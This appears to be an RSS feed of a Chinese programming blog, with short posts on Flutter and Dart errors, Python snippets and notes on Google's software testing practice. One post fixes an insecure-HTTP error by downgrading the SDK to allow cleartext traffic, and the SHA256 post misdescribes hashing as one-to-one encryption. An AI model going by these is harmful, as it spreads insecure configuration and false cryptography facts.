 1.报错 ERROR:flutter/shell/common/shell.cc(181)] Dart Error: Unhandled exception: setState() called after dispose(): _ShelfState#5b9c1(lifecycle state: defunct, not mounted) 2.原因 在 Flutter 构件树被销毁后仍然执行了 setState 方法改变页面状态，当 setState 方法改变页面状态时，需要改变的页面被销毁了。使用场景为，当触发 setState 方法时从当前页面切换到其他页面。
3.解决 在 setState 之前加一句判断，判断当前页面是否存在于构件树中。
// mounted 为 true 表示当前页面挂在到构件树中，为 false 时未挂载当前页面 if (mounted) { setState(() { // xxxx  }) } </description>
    </item>
    
    <item>
      <title>Dart(4)——睡眠</title>
      <link>https://ac-lm.github.io/posts/dart/dart4%E7%9D%A1%E7%9C%A0/</link>
      <pubDate>Tue, 27 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/dart/dart4%E7%9D%A1%E7%9C%A0/</guid>
      <description>In Async Code (异步) await Future.delayed(Duration(seconds: 1)); In Sync Code (同步) import &amp;#39;dart:io&amp;#39;; sleep(Duration(seconds:1)); </description>
    </item>
    
    <item>
      <title>Flutter(5)—SDK27 不支持 HTTP 协议</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter5sdk27-%E4%B8%8D%E6%94%AF%E6%8C%81-http-%E5%8D%8F%E8%AE%AE/</link>
      <pubDate>Tue, 27 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter5sdk27-%E4%B8%8D%E6%94%AF%E6%8C%81-http-%E5%8D%8F%E8%AE%AE/</guid>
      <description>参考原文：Insecure HTTP is not allowed by platform @csdn 
 1.报错 DioError [DioErrorType.DEFAULT]: Bad state: Insecure HTTP is not allowed by platform2.原因 平台不支持不安全的 HTTP 协议，即不允许访问 HTTP 域名的地址。这是因为 IOS 和 Android 9.0 对网络请求做了一些限制，不能直接访问 HTTP 域名的地址。
3.解决方案 降低 SDK 版本至 27 或 27 以下</description>
    </item>
    
    <item>
      <title>Google软件测试之道(3)</title>
      <link>https://ac-lm.github.io/posts/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%93/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%933/</link>
      <pubDate>Tue, 27 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%93/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%933/</guid>
      <description>参考原文：Google软件测试之道 @Whittaker Arb 
 测试工程师 测试工程师（Test Engineer，TE）的工作在于评估软件产品对用户的影响以及整体目标上的风险。因此，当TE进入产品的时候，需要考虑以下一些问题。
 当前软件的薄弱点在哪里？ 有没有安全、隐私、性能、可靠性、可用性、兼容性、全球化和其他方面的问题？ 主要用户场景是否功能正常？对于全世界不同国家的用户都是这样么？ 这个产品能与其他产品（软件和硬件）互操作吗？ 当发生问题的时候，是否容易诊断问题所在？  这些东西加起来，构成发布待评估软件的风险概要。TE并不需要自己去解决所有这些问题，但必须保证这些问题被解决掉。TE的根本使命是保护用户和业务的利益，使之不受到糟糕的设计、令人困惑的用户体验、功能bug、安全和隐私等问题的困扰。
显然，在不同的项目中，TE的工作内容也会有较大的不同。一些TE会在编码方面投入较多的时间，但主要是写中到大型的测试（如端到端的用户场景）而非小型测试。其他一些TE会检查代码和系统设计以确定失效模式，并寻找导致失效的错误路径。在这种情况下，TE可能会去修改代码，但这与从头编写代码是不同的。TE在测试计划及测试完整性上必须更加系统和周密，重点在真实用户的使用方式和系统级别的体验上。TE擅长发现需求中的模糊之处，分析沟通不明确的问题。
成功的TE游走于这些微妙且敏感的地方，有时候还要与个性很强的开发和产品人员打交道。一旦找到薄弱点，TE就会通过测试使软件出错，然后与开发、产品一起推动解决这些bug。
TE的工作经常需要去打破常规流程。TE可以在任何时间进入项目，必须迅速评估项目、代码、设计和用户的当前状态，然后决定首要的关注点。如果项目刚刚开始，测试计划是第一优先级。有时，TE在产品后期被拉进来帮助评估项目是否可以发布，或者在beta版本发布之前确认还有哪些主要的问题。当TE进入了一个新被收购的应用或缺少相关应用经验的时候，他们经常会先去做一些不怎么需要计划的探索式测试。有时，项目已经很久没有发布了，只是需要去做一些修饰、安全补丁或界面更新，这需要迥然不同的方法。
下面是Google关于TE职责的一般性描述。
 测试计划和风险分析； 评审需求、设计、代码和测试； 探索式测试； 用户场景； 编写测试用例； 执行测试用例； 众包（译注：crowdsourcing，是互联网带来的新的生产组织形式。一个公司或机构把过去由员工执行的工作任务，以自由自愿的形式外包给非特定的（通常是大型的）大众网络的做法）； 使用统计； 用户反馈。  测试计划 和测试人员相比，开发人员有一个优势就是他们的工作产物是每个人都真正关心的。开发人员编写代码，构建用户期望的、能为公司赚钱的应用。很明显，代码是项目过程中产生的最重要的文档。然而，测试人员要处理的是真正的文档和其他临时性的事物。在项目的早期阶段，测试人员编写测试计划；然后，他们创建和执行测试用例，编写bug报告；接下来是准备覆盖度报告，收集用户满意度和软件质量数据。在软件成功发布（或失败）之后，很少有人会问及测试产物是什么。如果软件深受人们喜爱，大家就会认为测试所作所为是理所应当的；如果软件很糟糕，人们可能就会质疑测试工作。但其实也没人真正想去了解测试到底做了什么。
测试人员不应该对测试文档过于珍爱。软件开发过程充满了痛苦的挣扎：编码、评审、构建、测试、一轮接一轮的开发等，在这个过程里实在很难有时间坐下来欣赏一下测试计划。糟糕的测试用例不会受到足够的关注而被改善，它们只会被抛弃。则被留下来的是更好地测试用例。大家的关注点集中在不断增长的代码库，这才是最重要的东西，理应如此。
作为一种测试文档，测试计划的生命周期是所有测试产物中最短的（显然，当客户明确要求编写测试计划，或者出于某些政府法规要求，就没这么灵活了。某些场合必须有测试计划并且保持更新）。在项目早期，人们需要一个测试计划。事实上，项目经理经常坚持必须有一个测试计划，并将编写测试计划作为一个比较重要的里程碑。但是，一旦计划就绪，这些人就把它扔到一边了，既不评审也不更新。测试计划就像是闹脾气的小孩儿手中可爱的毛绒玩具。我们希望它总是存在，到哪里都能带着它，但却从不真正关注它。只有它被拿走的时候，我们才会发出尖叫。
测试计划是最早出现、最先被遗忘的测试产物。在项目早期，测试计划代表了对软件功能的预期。但是，除非得到持续的关注，它会很快随着新代码的完成、功能特性的改变以及设计的调整而过期。伴随着计划内或计划外的变更，维护一份测试计划是要花费大量精力的，除非多数项目的成员会定期查看，否则测试计划并没有什么价值。
后面这一点才是测试计划真正的杀手：试问在产品的整个生命周期中，测试计划能在多大程度上作为测试活动的指导？测试人员会不断参考计划来安排一个应用的测试吗？会要求开发人员在功能增加或修改时去更新测试计划吗？在开发经理管理 to-do 列表的时候，他们会在桌面上打开一份测试计划吗？在进展沟通会议上，测试经理会经常参考测试计划的内容吗？如果测试计划真的重要，那么所有这些事情应该每天都会发生。理想情况下，测试计划应当在项目执行中发挥核心作用，应当在软件的整个生命周期中持续有效：随着代码库的更新而更新，时刻代表最新的产品功能，而不是停留在项目开始阶段时的样子。它应该可以帮助一个新加入的工程师迅速跟上项目进展。
但是，这些不过都是理想情况而已。在Google或其他公司中，其实很少有测试人员能真正做到。下面是我们希望测试计划具有的一些特性。
 及时地更新。 描述了软件的目标和卖点。 描述了软件的结构、各种组件和功能特性的名称。 描述了软件的功能和操作简介。 从纯粹测试的角度看，我们担心的是测试计划的投入和价值产出是否匹配。 不必花过多的时间去撰写，必须随时可以被修改。 应该描述必测点。 应该能在测试中提供有用的信息，从而帮助确定进展以及覆盖率上的不足。  在Google，测试计划的历史与我们所经历的其他公司基本相同。测试计划曾经是由各团队根据自身的实际情况自行定义和执行的。一些团队用文本文档和电子表格编写测试计划，与整个工程团队分享，但不放在中心数据库里；一些团队将测试计划放到产品主页的链接里；一些团队则放到项目的内部 Google Sites 页面里，或者作为工程设计文档或内部 wikis 的链接；少数团队甚至使用 Microsoft Word 文档，通过电子邮件传播；一些团队完全没有测试计划。我们只能认为测试用例的总数代表了整个测试计划。
这些测试计划的评审链条是不透明的，很难确定作者和评审者。相当多的测试计划有一个时间和日期戳，非常清楚地表明了他们悠长的被遗忘的历史，就像冰箱角落里酱罐的保质期一样。它一定在某个时间对某个人发挥了重要的作用，但那个时间已经一去不返了。
ACC ACC（Attribute Component Capability，即特质、组件、能力。这是一种测试计划的替代方法），ACC的指导原则如下。
 避免散漫的文字，推荐使用简明的列表。并不是所有的测试人员都想当小说家，也不具备将一个产品的目标或测试需求表达成散文的技能。而且，冗词赘句容易误读，只列出要点和事实就行了。 不必推销。测试计划不是营销文案，既不是要讨论一个产品满足了多么重要的市场定位，也不是讨论这个产品有多么酷的功能。测试计划不是给客户或分析师看的，它的受众人群是工程师。 简洁。测试计划并没有长度的要求。它不是中学的项目作业，长度无关紧要，不是越长越好。计划的大小与测试问题的规模有关，与作者的写作欲望无关。 不要把不重要的、无法执行的东西放进测试计划。相关人员毫不关心的东西，就一个词也不要出现。 渐进式的描述（Make it flow）。测试计划的每个部分应该是前面部分的延伸，以便读者可以随时停止阅读并且对产品的功能有一个初步的印象。如果读者希望了解更多的细节，那么他可以继续读下去。 指导计划者的思路。一个好的计划过程能帮助计划者思考产品功能及其测试需求，从而有条不紊地从高层概念过渡到可以被直接实现的低层细节。 最终结果应该是测试用例。在计划完成的时候，它不仅要清楚地描述要做什么样的测试，并且还可以清楚地指导测试用例的编写。做出一个不直接指导测试的计划纯粹是在浪费时间。 最后一点非常重要：如果测试计划没有把测试用例应该怎么执行描述得足够详细，它就没有达到预先设定的帮助测试的本义。对测试的计划（the planning of tests）而言，它显然应该让我们清楚地知道需要编写哪些测试用例。当你正好处于&amp;quot;完全了解需要编写哪些测试&amp;quot;这一点时，才算完成了测试计划。  ACC通过指导计划者依次考察产品的三个维度达成这个目标：描述产品目标的形容词和副词；确定产品各部分、各特性的名词；描述产品实际做什么的动词。这样，我们通过测试完成的就是验证这些能力（capabilities）能正常运作、产品各组件（component）能满足应用的目标。</description>
    </item>
    
    <item>
      <title>Dart(3)——文件操作</title>
      <link>https://ac-lm.github.io/posts/dart/dart3%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</link>
      <pubDate>Mon, 26 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/dart/dart3%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</guid>
      <description>1.写文件 无需手动关闭文件，文件写入完成后自动关闭
import &amp;#39;dart:io&amp;#39;; void main() async{ // 创建文件  File file = new File(&amp;#39;test.txt&amp;#39;); String content = &amp;#39;The easiest way to write text to a file is to create a File&amp;#39;; try { // 向文件写入字符串  await file.writeAsString(content); print(&amp;#39;Data written.&amp;#39;); } catch (e) { print(e); } } ———————————————— Future&amp;lt;File&amp;gt; writeAsString(String contents, {FileMode mode: FileMode.write, Encoding encoding: utf8, bool flush: false}) FileMode：read，write，append，writeOnly，writeOnlyAppend 需要手动关闭文件
import &amp;#39;dart:io&amp;#39;; void main() async{ // 创建文件  File file = new File(&amp;#39;test.</description>
    </item>
    
    <item>
      <title>Flutter(4)——TabController 的两次回调</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter4tabcontroller-%E7%9A%84%E4%B8%A4%E6%AC%A1%E5%9B%9E%E8%B0%83/</link>
      <pubDate>Mon, 26 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter4tabcontroller-%E7%9A%84%E4%B8%A4%E6%AC%A1%E5%9B%9E%E8%B0%83/</guid>
      <description>1.TabController 的回调 TabController 监听在点击切换 tab 的时候会回调两次，左右滑动切换 tab 正常调用一次，这是由于在点击切换 tab 的时候会执行一个动画效果，滑动切换的时候是没有的，在这个过程中多触发了一次 Listener。
因此，在设计时需要注意该问题，以避免监听出错。</description>
    </item>
    
    <item>
      <title>Dart(2)——正则</title>
      <link>https://ac-lm.github.io/posts/dart/dart2%E6%AD%A3%E5%88%99/</link>
      <pubDate>Sun, 25 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/dart/dart2%E6%AD%A3%E5%88%99/</guid>
      <description>1.属性 RegExp exp = new RegExp(r&amp;#34;(\w+)&amp;#34;); // 返回正则表达式的哈希码 print(exp.hashCode); // 正则表达式是否区分大小写 print(exp.isCaseSensitive); // 正则表达式是否匹配多行 print(exp.isMultiLine); // 返回源正则表达式字符串 print(exp.pattern); // 返回对象运行时的类型 print(exp.runtimeType); 2.方法 RegExp exp = new RegExp(r&amp;#34;(\w+)&amp;#34;); // 返回正则表达式匹配项的可迭代对象 match = exp.allMatches(&amp;#34;abc def ghi&amp;#34;) for (Match m in matches) { print(m.group(0)); } // 搜索并返回第一个匹配项，没有则返回null print(exp.firstMatch(&amp;#34;&amp;#34;)); // 正则表达式是否找到匹配项 print(exp.hasMatch(&amp;#34;as&amp;#34;)); // 从第几个字符开始匹配正则表达式 print(exp.matchAsPrefix(&amp;#34;ab cd&amp;#34;,3)); // 返回正则表达式的第一个匹配字符串 print(exp.stringMatch(&amp;#34;abc de&amp;#34;)); // 返回正则表达式的字符串表示 print(exp.toString()); </description>
    </item>
    
    <item>
      <title>Flutter(3)——下载环境配置</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter3%E4%B8%8B%E8%BD%BD%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Sun, 25 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter3%E4%B8%8B%E8%BD%BD%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
      <description>1.环境设置 由于Flutter默认配置的下载服务器在国外，往往会出现网络波动无法下载的情况，因此需要重新配置国内镜像，避免出现无法下载情况。在终端命令或 Windows 环境变量中增加键值
export PUB_HOSTED_URL=https://pub.flutter-io.cn export FLUTTER_STORAGE_BASE_URL=https://storage.flutter-io.cn </description>
    </item>
    
    <item>
      <title>Dart(1)——基本数据类型</title>
      <link>https://ac-lm.github.io/posts/dart/dart1%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Sat, 24 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/dart/dart1%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid>
      <description>1.数字与布尔值 a.属性 int figureA = -93; // figureA 是否为负数  print(figureA.isNegative); // figureA 是否是有限的  print(figureA.isFinite); // figureA 是否正无穷大或负无穷大  print(figureA.isInfinite); double figureB = 64.742; // 返回 figureB 的符号，-1.0:值小于0、+1.0:值大于0、-0.0/0.0/NaN:值是其本身  print(figureB.sign); // 返回 figureB 运行时的类型  print(figureB.runtimeType); // 返回 figureB 的哈希码  print(figureB.hashCode); int figureC = 13; // figureC 是否为奇数  print(figureC.isOdd); // figureC 是否为偶数  print(figureC.isEven); // 返回 figureC 所占存储位  print(figureC.bitLength); b.方法 int figureA = -93; // 返回 figureA 的绝对值  print(figureA.</description>
    </item>
    
    <item>
      <title>Flutter(2)——混合开发</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter2%E6%B7%B7%E5%90%88%E5%BC%80%E5%8F%91/</link>
      <pubDate>Fri, 23 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter2%E6%B7%B7%E5%90%88%E5%BC%80%E5%8F%91/</guid>
      <description>参考原文：《Flutter实战》@wendux 
 1.原生开发 原生应用程序是指某一个移动平台（比如iOS或安卓）所特有的应用，使用相应平台支持的开发工具和语言，并直接调用系统提供的SDK API。比如Android原生应用就是指使用Java或Kotlin语言直接调用Android SDK开发的应用程序；而iOS原生应用就是指通过Objective-C或Swift语言直接调用iOS SDK开发的应用程序。原生开发有以下主要优势：
 可访问平台全部功能（GPS、摄像头）； 速度快、性能高、可以实现复杂动画及绘制，整体用户体验好；  主要缺点：
 平台特定，开发成本高；不同平台必须维护不同代码，人力成本随之变大； 内容固定，动态化弱，大多数情况下，有新功能更新时只能发版；  在移动互联网发展初期，业务场景并不复杂，原生开发还可以应对产品需求迭代。 但近几年，随着物联网时代到来、移动互联网高歌猛进，日新月异，在很多业务场景中，传统的纯原生开发已经不能满足日益增长的业务需求。主要表现在：
 动态化内容需求增大；当需求发生变化时，纯原生应用需要通过版本升级来更新内容，但应用上架、审核是需要周期的，这对高速变化的互联网时代来说是很难接受的，所以，对应用动态化(不发版也可以更新应用内容)的需求就变的迫在眉睫。 业务需求变化快，开发成本变大；由于原生开发一般都要维护Android、iOS两个开发团队，版本迭代时，无论人力成本，还是测试成本都会变大。  总结一下，纯原生开发主要面临动态化和开发成本两个问题，而针对这两个问题，诞生了一些跨平台的动态化框架。
2.跨平台技术简介 针对原生开发面临问题，人们一直都在努力寻找好的解决方案，而时至今日，已经有很多跨平台框架(注意，本书中所指的“跨平台”若无特殊说明，即特指Android和iOS两个平台)，根据其原理，主要分为三类：
 H5+原生（Cordova、Ionic、微信小程序） JavaScript开发+原生渲染 （React Native、Weex、快应用） 自绘UI+原生(QT for mobile、Flutter)  在接下来的章节中我们逐个来看看这三类框架的原理及优缺点。
a.H5+原生混合开发 这类框架主要原理就是将APP的一部分需要动态变动的内容通过H5来实现，通过原生的网页加载控件WebView (Android)或WKWebView（iOS）来加载（以后若无特殊说明，我们用WebView来统一指代android和iOS中的网页加载控件）。这样以来，H5部分是可以随时改变而不用发版，动态化需求能满足；同时，由于h5代码只需要一次开发，就能同时在Android和iOS两个平台运行，这也可以减小开发成本，也就是说，H5部分功能越多，开发成本就越小。我们称这种h5+原生的开发模式为混合开发，采用混合模式开发的APP我们称之为混合应用或Hybrid APP ，如果一个应用的大多数功能都是H5实现的话，我们称其为Web APP 。
目前混合开发框架的典型代表有：Cordova、Ionic 和微信小程序，值得一提的是微信小程序目前是在webview中渲染的，并非原生渲染，但将来有可能会采用原生渲染。
如之前所述，原生开发可以访问平台所有功能，而混合开发中，H5代码是运行在WebView中，而WebView实质上就是一个浏览器内核，其JavaScript依然运行在一个权限受限的沙箱中，所以对于大多数系统能力都没有访问权限，如无法访问文件系统、不能使用蓝牙等。所以，对于H5不能实现的功能，都需要原生去做。而混合框架一般都会在原生代码中预先实现一些访问系统能力的API， 然后暴露给WebView以供JavaScript调用，这样一来，WebView就成为了JavaScript与原生API之间通信的桥梁，主要负责JavaScript与原生之间传递调用消息，而消息的传递必须遵守一个标准的协议，它规定了消息的格式与含义，我们把依赖于WebView的用于在JavaScript与原生之间通信并实现了某种消息传输协议的工具称之为WebView JavaScript Bridge, 简称 JsBridge，它也是混合开发框架的核心。
b.JavaScript开发+原生渲染 React Native (简称RN)是Facebook于2015年4月开源的跨平台移动应用开发框架，是Facebook早先开源的JS框架 React 在原生移动应用平台的衍生产物，目前支持iOS和Android两个平台。RN使用Javascript语言，类似于HTML的JSX，以及CSS来开发移动应用，因此熟悉Web前端开发的技术人员只需很少的学习就可以进入移动应用开发领域。
c.自绘UI+原生 在本篇中，我们看看最后一种跨平台技术：自绘UI+原生。这种技术的思路是，通过在不同平台实现一个统一接口的渲染引擎来绘制UI，而不依赖系统原生控件，所以可以做到不同平台UI的一致性。注意，自绘引擎解决的是UI的跨平台问题，如果涉及其它系统能力调用，依然要涉及原生开发。这种平台技术的优点如下：
 性能高；由于自绘引擎是直接调用系统API来绘制UI，所以性能和原生控件接近。 灵活、组件库易维护、UI外观保真度和一致性高；由于UI渲染不依赖原生控件，也就不需要根据不同平台的控件单独维护一套组件库，所以代码容易维护。由于组件库是同一套代码、同一个渲染引擎，所以在不同平台，组件显示外观可以做到高保真和高一致性；另外，由于不依赖原生控件，也就不会受原生布局系统的限制，这样布局系统会非常灵活。  不足：
 动态性不足；为了保证UI绘制性能，自绘UI系统一般都会采用AOT模式编译其发布包，所以应用发布后，不能像Hybrid和RN那些使用JavaScript（JIT）作为开发语言的框架那样动态下发代码。 开发效率低：QT使用C++作为其开发语言，而编程效率是直接会影响APP开发效率的，C++作为一门静态语言，在UI开发方面灵活性不及JavaScript这样的动态语言，另外，C++需要开发者手动去管理内存分配，没有JavaScript及Java中垃圾回收（GC）的机制。  也许你已经猜到Flutter就属于这一类跨平台技术，没错，Flutter正是实现一套自绘引擎，并拥有一套自己的UI布局系统。不过，自绘制引擎的思路并不是什么新概念，Flutter并不是第一个尝试这么做的，在它之前有一个典型的代表，即大名鼎鼎的QT。</description>
    </item>
    
    <item>
      <title>Flutter(1)——例程</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter1%E4%BE%8B%E7%A8%8B/</link>
      <pubDate>Thu, 22 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter1%E4%BE%8B%E7%A8%8B/</guid>
      <description>参考原文：《Flutter实战》@wendux 
 1.例程代码 import &amp;#39;package:flutter/material.dart&amp;#39;; void main() { runApp(MyApp()); } class MyApp extends StatelessWidget { @override Widget build(BuildContext context) { return MaterialApp( title: &amp;#39;Flutter Demo&amp;#39;, theme: ThemeData( primarySwatch: Colors.blue, ), home: MyHomePage(title: &amp;#39;Flutter Demo Home Page&amp;#39;), ); } } class MyHomePage extends StatefulWidget { MyHomePage({Key key, this.title}) : super(key: key); final String title; @override _MyHomePageState createState() =&amp;gt; _MyHomePageState(); } class _MyHomePageState extends State&amp;lt;MyHomePage&amp;gt; { int _counter = 0; void _incrementCounter() { setState(() { _counter++; }); } @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( title: Text(widget.</description>
    </item>
    
    <item>
      <title>BUG(17)——字典在遍历时不能进行修改</title>
      <link>https://ac-lm.github.io/posts/bug/bug17%E5%AD%97%E5%85%B8%E5%9C%A8%E9%81%8D%E5%8E%86%E6%97%B6%E4%B8%8D%E8%83%BD%E8%BF%9B%E8%A1%8C%E4%BF%AE%E6%94%B9/</link>
      <pubDate>Wed, 31 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug17%E5%AD%97%E5%85%B8%E5%9C%A8%E9%81%8D%E5%8E%86%E6%97%B6%E4%B8%8D%E8%83%BD%E8%BF%9B%E8%A1%8C%E4%BF%AE%E6%94%B9/</guid>
      <description>BUG 描述 a={&amp;#39;a&amp;#39;:1, &amp;#39;b&amp;#39;:0, &amp;#39;c&amp;#39;:1, &amp;#39;d&amp;#39;:0} for key in a.keys(): del a[key] 执行上述代码时会出现报错
Resolution 字典在遍历时不能被修改，需要将字典转成列表或集合再进行遍历。
a={&amp;#39;a&amp;#39;:1, &amp;#39;b&amp;#39;:0, &amp;#39;c&amp;#39;:1, &amp;#39;d&amp;#39;:0} for key in list(a.keys()): del a[key] </description>
    </item>
    
    <item>
      <title>Google软件测试之道(2)</title>
      <link>https://ac-lm.github.io/posts/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%93/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%932/</link>
      <pubDate>Wed, 31 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%93/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%932/</guid>
      <description>参考原文：Google软件测试之道 @Whittaker Arb 
 版本划分 Google经常在最初的版本里只包含最基本的可用功能，然后在后继的快速迭代的过程中得到内部和外部用户的反馈，而且在每次迭代的过程中都非常注重质量。一个产品在发布给用户使用之前，一般都要经历金丝雀版本、开发版本、测试版本、beta或正式发布版本。
Google发布的过程虽然快，但也并不像想象中如牛仔一般的鲁莽与仓促。实际上，为了发布我们称之为beta的版本，一个产品要经历一系列的内部版本验证，用以证明它已经具备了一定的质量。
 金丝雀版本：这是每日都要构建的版本，用来排除过滤一些明显不适宜的版本。就像煤矿井里的金丝雀（译注：17世纪，英国人将金丝雀放到煤矿井里检测井中空气质量。如果金丝雀死了，则表示矿井中的空气已达到令人中毒的水平。此处意为对一件事情的预警），如果构建失败了的话，意味着我们的流程可能在哪里出了问题，需要去复查一遍我们的工作。使用金丝雀版本需要极强的容忍度，而且在这个版本下可能无法使用应有的基本功能。一般来说，只有这个产品的工程师（开发或测试人员）和管理人员才会安装使用金丝雀版本。 开发版本：这是开发人员日常使用的版本，一般是每周发布一个。该版本具有一定的功能并通过了一系列的测试（我们将会在随后的章节里讨论这点）。所有这个产品下的工程师都会被要求去安装这个版本，并在日常工作中真正使用它，这样可以持续对这个版本进行测试。如果一个开发版本不能够满足日常真实工作的需求，那么它将会被打回为金丝雀版本。发生这种情况不但令人郁闷，工程团队也需要再花费大量的时间去重新评估。 测试版本：这是一个通过了持续测试的版本。这个版本基本上是最近一个月里的最佳版本了，也是工程师在日常工作中使用的最稳定最信任的一个版本。测试版本可以被挑选作为内部尝鲜（译注：dog food）版本，如果该版本有比较持续的优良表现，也是作为beta测试的候选版本。一些情况下，如果测试版本在公司内部使用得足够稳定，一些想更早尝试这个产品的外部合作伙伴也会使用这个版本。 beta或发布版本：这个版本是由非常稳定的测试版本演变而来，并经历了内部使用和通过所有质量考核的一个版本，也是对外发布的第一个版本。  测试类型 Google并没有使用代码测试、集成测试、系统测试等这些命名方式，而是使用小型测试、中型测试、大型测试这样的称谓（不要和敏捷社区发的那些T恤型号混为一谈），着重强调测试的范畴规模而非形式。小型测试意味着涵盖较少量的代码，其他的测试类型以此类推。Google的三类工程师都会去执行其中的任何一种测试，无论是自动化的还是手动的。测试的规模越小，就越有可能被实现成为自动化的测试。
小型测试 一般来说（但也并非所有）都是自动化实现的，用于验证一个单独函数或独立功能模块的代码是否按照预期工作，着重于典型功能性问题、数据损坏、错误条件和大小差一错误等方面的验证。小型测试的运行时间一般比较短，通常是在几秒或更短的时间内就可以运行完毕。通常，小型测试是由SWE来实现，也会有少量的SET参与，TE几乎不参与小型测试。小型测试一般需要使用mock和fake（译注：mock fake环境是实际依赖系统的替代者，会提供相应的功能，但这些系统可能不存在，或者缺陷太多不可靠，或者是一些很难模拟的错误条件）才能运行。TE几乎不编写小型测试代码，但会参与运行这些测试，来诊断一些特定错误。小型测试主要尝试解决的问题是&amp;quot;这些代码是否按照预期的方式运行&amp;quot;。
中型测试 通常也都是自动化实现的。该测试一般会涉及两个或两个以上，甚至更多模块之间的交互。测试重点在于验证这些&amp;quot;功能近邻区&amp;quot;之间的交互，以及彼此调用时的功能是否正确（我们称功能交互区域为&amp;quot;功能近邻区&amp;quot;）。在产品早期开发过程中，在独立模块功能被开发完毕之后，SET会驱动这些测试的实现及运行，SWE会深度参与，一起编码、调试和维护这些测试。如果一个中型测试运行失败，SWE会自觉地去查看分析原因。在开发过程的后期，TE会通过手动的方式（如果比较难去实现自动化或实现的代价较大时），或者自动化地执行这些用例。中型测试尝试去解决的问题是，一系列临近的模块互相交互的时候，是否如我们预期的那样工作。
大型测试 涵盖三个或以上（通常更多）的功能模块，使用真实用户使用场景和实际用户数据，一般可能需要消耗数个小时或更长的时间才能运行完成。大型测试关注的是所有模块的集成，但更倾向于结果驱动，验证软件是否满足最终用户的需求。所有的三种工程师角色都会参与到大型测试之中，或是通过自动化测试，或是探索式测试。大型测试尝试去解决的问题是，这个产品操作运行方式是否和用户的期望相同，并产生预期的结果。这种端到端的使用场景以及在整体产品或服务之上的操作行为，即是大型测试关注的重点。
小型测试涵盖单一的代码段，一般运行在完全虚假实现（fake）的环境里。中型测试涵盖多个模块且重点关注在模块之间的交互上，一般运行在虚假实现（fake）环境或真实环境中。大型测试涵盖任意多个模块，一般运行在真实的环境中，并使用真正的用户数据与资源。
自动化测试和手动测试 最后，关于自动化测试和手动测试的比例，对于所有的三种类型测试，当然更倾向于前者。如果能够自动化，并不需要人脑的智睿与直觉来判断，那就应该以自动化的方式实现。但在一些情况下需要人类智慧的判断，如用户界面是否漂亮、保留的数据是否包含隐私等方面，这些还是需要手动测试来完成。
正如上文中提到的，同时也是值得重点关注的一点，Google也有大量的手动测试，有些使用脚本的方式在记录（译注：scripted ，脚本的方式，通过把每一个步骤都记录下来的方式表示用例的内容），而另外一些使用探索式的方法，这些测试都在被密切地关注，以后可能被自动化方式所替代。通过使用定位点击的验证方式、录制技术等可以把一些手动测试转变成自动化测试，这些自动化测试在每次建立之后都会重复地回归运行，而手动测试更倾向于关注于新功能。我们甚至把开bug和日常的手动工作都自动化实现了，例如，如果自动化用例运行失败，系统会自动检查到最后一次代码变更的内容，这些变更极有可能是造成失败的罪魁祸首。系统会自动给代码变更的提交者发送一封邮件，并新开一个bug来记录这个问题。 将自动化推至&amp;quot;最后一英寸人类的智慧&amp;quot;是Google 正在构建的下一代测试工具的设计目标。</description>
    </item>
    
    <item>
      <title>Python(28)——hashlib模块</title>
      <link>https://ac-lm.github.io/posts/python/python28hashlib-%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Wed, 31 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python28hashlib-%E6%A8%A1%E5%9D%97/</guid>
      <description>1.SHA256 SHA256 的全称是Secure Hash Algorithm 256，一种常用的加密算法，是SHA-2族算法中的一个，其它的还是SHA222、SHA512等。
 Secure的意思是指算法的输入输出一一对应，且是不可逆的（即只有编码而没有解码） Hash Algorithm指的是散列算法，散列算法指的是将一个任意长度的输入数据转换成固定长度的输出 256是输出结果的位数，这个输出结果又被称为Hash值或者摘要  2.hashlib模块 hashlib是Python提供的能使用各类hash算法的一个模块
